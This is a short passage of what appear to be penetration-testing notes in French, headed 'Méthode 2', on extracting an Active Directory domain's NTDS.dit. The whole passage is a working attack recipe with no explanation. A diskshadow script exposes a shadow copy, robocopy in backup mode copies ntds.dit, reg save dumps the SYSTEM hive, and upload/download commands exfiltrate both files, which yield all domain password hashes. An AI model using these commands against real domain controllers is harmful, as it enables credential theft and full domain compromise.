### Méthode  2 : 
Pour récupérer le NTDS.dit de l'ad 
```bash 
nano test.dsh 

set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:

unix2dos test.dsh 
unix2dos: converting file test.dsh to DOS format...


cd C:/
mkdir Temp
upload test.dsh

diskshadow /s test.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system c:\Temp\system

download system
download ntds.dit

```



